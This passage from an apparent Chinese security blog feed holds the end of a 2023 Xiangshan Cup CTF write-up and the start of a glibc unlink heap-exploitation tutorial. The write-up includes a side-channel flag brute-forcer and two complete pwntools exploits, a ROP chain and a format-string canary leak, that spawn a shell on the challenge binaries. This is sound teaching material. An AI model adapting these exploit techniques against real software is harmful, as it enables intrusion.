3421916的形式输出，这也方便爆破脚本的编写</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sde -icount -- ./nesting<br></code></pre></td></tr></table></figure><p>可以发现每多输入一位，总指令数都会增加20万左右</p><p>flag的前4位必定是”flag”，分别输入”1111”,”f111”，”fl11”，”fla1”，”flag”可以发现在位数相同的情况下，flag每正确一位总指令数会增加55000左右，说明flag是逐位check的，并且不同结果的执行流长度相差较大，可以通过这一点来爆破flag</p><p>爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>p = process([<span class="hljs-string">&#x27;sde64&#x27;</span>,<span class="hljs-string">&#x27;-icount&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-string">&#x27;./nesting&#x27;</span>])<br>p.recvuntil(<span class="hljs-string">&#x27;Input your flag:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;ICOUNT:&#x27;</span>)<br>icount = <span class="hljs-built_in">int</span>(p.recvline())<br>p.close()<br><span class="hljs-keyword">return</span> icount<br><br>table = <span class="hljs-string">&#x27;0123456789abcdef-&#125;&#x27;</span><br><span class="hljs-comment">#table = string.printable</span><br>flag = <span class="hljs-string">&#x27;flag&#123;&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>t1 = run(flag+<span class="hljs-string">&#x27;#&#x27;</span>)<br>ok = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> table:<br>t2 = run(flag+ch)<br><span class="hljs-keyword">if</span>(t2-t1&gt;<span class="hljs-number">50000</span>):<br>flag = flag + ch<br>ok = <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(ok==<span class="hljs-number">0</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;result : &#x27;</span>+flag)<br>exit()<br><span class="hljs-comment">#flag&#123;2c7c093b-f648-11ed-a716-701ab8caaafe&#125;</span><br></code></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>main函数</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231029232915.png"></p><p>vuln函数</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231029232947.png"></p><p>先读取0x20的数据到bss段，再读取4字节数据，等于0x12345678的话vuln函数中可以栈溢出0x10字节，可以覆盖rbp和返回地址</p><p>思路是栈迁移到bss段，跳转到vuln中的read函数，向bss中的rbp-0x30处读入0x40的数据,不断重复构造。</p><p>注意第二次和第三次执行vuln中的read函数时ROP是在read函数中进行的，read函数本身没有push rbp和leave，只有ret，利用read中的ret返回到bss中的p64(rbp_ret) + p64(bss_addr-0x30-8) + p64(leave_ret)来反复在bss段进行ROP。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io,<span class="hljs-string">&#x27;b main&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>rbp_ret = <span class="hljs-number">0x401262</span><br>  <br>rdi_ret = <span class="hljs-number">0x401353</span><br><br>puts_got = <span class="hljs-number">0x404018</span><br><br>puts_plt = <span class="hljs-number">0x401080</span><br><br>bss_addr = <span class="hljs-number">0x4050A0</span><br><br>leave_ret = <span class="hljs-number">0x4012E0</span><br><br>vuln_read = <span class="hljs-number">0x401230</span> <br><br>io.recvuntil(<span class="hljs-string">&#x27;lets travel again!&#x27;</span>)<br>bss1 = p64(bss_addr) + p64(vuln_read)<br>io.send(bss1)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Input your setp number&#x27;</span>)<br>io.send(<span class="hljs-string">b&#x27;\x78\x56\x34\x12&#x27;</span>)<br><br><span class="hljs-comment">#debug()</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;TaiCooLa&#x27;</span>)<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(bss_addr) + p64(leave_ret)<br>io.send(payload1)<br><br>sleep(<span class="hljs-number">0.5</span>)<br>bss2 = p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(rbp_ret) + p64(bss_addr) + p64(vuln_read) + p64(bss_addr-<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + p64(leave_ret)<br>io.send(bss2)<br><br>puts_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>success(<span class="hljs-string">&#x27;puts_addr = &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br><br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><br>success(<span class="hljs-string">&#x27;libc_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>binsh = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>sleep(<span class="hljs-number">0.5</span>)<br>payload2 = p64(rdi_ret) + p64(binsh) + p64(system_addr) +  p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(rbp_ret) + p64(bss_addr-<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + p64(leave_ret)<br>io.send(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h2><p>本地运行条件：</p><ul><li><p>python3.7并安装numpy库，<a href="https://blog.csdn.net/qq_51116518/article/details/130184514">Ubuntu 下载并切换Python默认版本（无痛顺畅版）</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看并切换python版本</span><br>sudo update-alternatives --config python<br></code></pre></td></tr></table></figure></li><li><p>创建.&#x2F;tmp文件夹</p></li><li><p>在import app前添加</p></li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">sys.path.<span class="hljs-keyword">append</span>(&#x27;path_to/<span class="hljs-keyword">app</span>.cpython-37m-x86_64-linux-gnu.<span class="hljs-keyword">so</span>&#x27;)<br></code></pre></td></tr></table></figure><p>查看保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">checksec app.cpython-37m-x86_64-linux-gnu.so</span>  <br>  Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    RPATH:    &#x27;/home/xiran/anaconda3/envs/cython/lib&#x27;<br></code></pre></td></tr></table></figure><p>打开ida，通过查看字符串交叉引用找到Welcome2Pwnthon函数</p><p>发现泄露了app_so库中__pyx_f_3app_get_info函数的地址，第一次read后有格式化字符串漏洞，第二次read存在栈溢出。</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231031125959.png"></p><p>用gdb调试，在栈上找到了open64函数，并且在canary之前，那么一次格式化字符串可以泄露libc+canary</p><p>exp，ubuntu2004本机打通了，其它环境可能open64和canary的偏移要修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>io = process([<span class="hljs-string">&#x27;python3.7&#x27;</span>,<span class="hljs-string">&#x27;main.py&#x27;</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(io,<span class="hljs-string">&#x27;b _pyx_f_3app_Welcome2Pwnthon&#x27;</span>)<br>sleep(<span class="hljs-number">1</span>)<br>io.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Give you a gift &#x27;</span>)<br>app_info = <span class="hljs-built_in">int</span>(io.recv(),<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;app_info = &#x27;</span> + <span class="hljs-built_in">hex</span>(app_info))<br>app_base = app_info - <span class="hljs-number">0x68b0</span><br>success(<span class="hljs-string">&#x27;app_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(app_base))<br><br><span class="hljs-comment">#debug()</span><br>io.sendline(<span class="hljs-string">&#x27;%p-&#x27;</span>*<span class="hljs-number">35</span>)<br>datas = io.readline().decode().split(<span class="hljs-string">&quot;-&quot;</span>)<br>open64_addr = <span class="hljs-built_in">int</span>(datas[<span class="hljs-number">23</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">232</span><br>canary = <span class="hljs-built_in">int</span>(datas[<span class="hljs-number">29</span>],<span class="hljs-number">16</span>)<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;open64&#x27;</span>,open64_addr)<br>libc_base = open64_addr - libc.dump(<span class="hljs-string">&#x27;open64&#x27;</span>)<br>success(<span class="hljs-string">&#x27;libc_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>rdi_ret = app_base + <span class="hljs-number">0x3f8f</span><br>ret = app_base + <span class="hljs-number">0x301a</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.xmcve.com/2023/10/16/%E9%A6%99%E5%B1%B1%E6%9D%AF2023-Writeup/">星盟2023香山杯2023香山杯wp</a></p><p>ArrestYou香山杯2023香山杯wp，公众号山海之关</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2023/05/18/unlink/"/>
    <url>/2023/05/18/unlink/</url>
    
    <content type="html"><![CDATA[<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>glibc2.23 unlink源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span><br>    FD = P-&gt;fd;      <br>    BK = P-&gt;bk;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  <br>    <span class="hljs-keyword">else</span> &#123;      <br>        FD-&gt;bk = BK;      <br>        BK-&gt;fd = FD;      <br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      <br>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)      <br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    <br>      malloc_printerr (check_action,      <br>       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    <br>       P, AV);      <br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;      <br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      <br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      <br>                <span class="hljs-keyword">else</span> &#123;      <br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;     <br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      <br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      <br>                  &#125;      <br>              &#125; <span class="hljs-keyword">else</span> &#123;      <br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>              &#125;      <br>          &#125;      <br>      &#125;      <br>&#125;<br></code></pre></td></tr></table></figure><p>glibc 2.31unlink源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">unlink_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<span class="hljs-comment">//多了这个检测，要求当前的chunk_size == next_chunk的prev_size</span><br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br><br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br><br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>    &#125;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.31比2.23多了chunk_size &#x3D;&#x3D; next_chunk的prev_size的检测，prev_size位正常情况下都是能修改的，更不用说能修改prev_inuse位的情况，所以影响不大，下面以2.23为例</p><h2 id="1-哪些情况下会unlink"><a href="#1-哪些情况下会unlink" class="headerlink" title="1.哪些情况下会unlink"></a>1.哪些情况下会unlink</h2><p><strong>malloc</strong><br>从恰好大小合适的largebin中获取chunk，发生unlink<br>从比malloc要求大的largebin中取chunk，发生unlink<br><strong>Free</strong><br>后向合并,合并物理相邻低物理地址空闲chunk时<br>前向合并,合并物理相邻高物理地址空闲chunk时(top chunk除外)</p><p>合并时对被合并的chunk的大小无要求，前向合并时，在低地址的chunk中构造一个被合并的chunk，同时将高地址chunk的prev_size位设置成被合并chunk的大小(包括chunk_header)，size位的最低地址设置为0</p><p><strong>malloc_consolidate</strong><br>后向合并,合并物理相邻低地址空闲chunk时。<br>前向合并，合并物理相邻高地址空闲 chunk时（top chunk除外）<br><strong>realloc</strong></p><p>前向扩展，合并物理相邻高地址空闲chunk（除top chunk)</p><h3 id="为什么small-bin和unsorted-bin不发生unlink"><a href="#为什么small-bin和unsorted-bin不发生unlink" class="headerlink" title="为什么small bin和unsorted bin不发生unlink"></a>为什么small bin和unsorted bin不发生unlink</h3><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibc malloc和free源码解析</a></p><p>事实上small bin和unsorted bin是在malloc函数中进行脱链的，而不是通过unlink函数，当malloc的chunk需要从small bin和unsorted bin中取出时，进行类似unlink中的操作</p><p>下面是malloc函数中small bin的分配源码，关键是这几句，victim指向双向链表末尾的small chunk（small bin采用先进先出策略），该chunk的fd指向链表头，即代码中的bin，bk指向前一个chunk</p><p> if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</p><p>bck &#x3D; victim-&gt;bk;</p><p>bin-&gt;bk &#x3D; bck;<br>bck-&gt;fd &#x3D; bin;</p><p>这个过程其实和unlink很像，但问题在于bin是不可控的，如果按照unlink的利用思路，bin-&gt;bk &#x3D; bck;不仅无法通过fd来指定地址，还会破坏链表，bck-&gt;fd &#x3D; bin;可以由bk来指定要修改的地址，但是内容固定为bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS             128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">     hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">     processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">     anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">   */</span><br><br>  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              bck = victim-&gt;bk;<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>              set_inuse_bit_at_offset (victim, nb);<br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-unlink时的漏洞及利用"><a href="#2-unlink时的漏洞及利用" class="headerlink" title="2.unlink时的漏洞及利用"></a>2.unlink时的漏洞及利用</h2><p>默认64位</p><p>关键代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">FD = P-&gt;fd;      <br>BK = P-&gt;bk;<br><br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><br>FD-&gt;bk = BK;      <br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>绕过检测要求：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;fd-&gt;bk = p     <br>p-&gt;bk-&gt;fd = p<br>等价于<br>*(*(P+<span class="hljs-number">0X10</span>)+<span class="hljs-number">0X18</span>) = P<br>*(*(P+<span class="hljs-number">0X18</span>)+<span class="hljs-number">0X10</span>) = P <br>等价于<br>FD = &amp;p - <span class="hljs-number">0x18</span>  #&amp;p为heap_array中当前chunk(被合并chunk)的指针的存放地址<br>BK = &amp;p - <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><p> 也就是说把被unlink的chunk的<strong>fd和bk分别设置成&amp;p - 0x18和&amp;p - 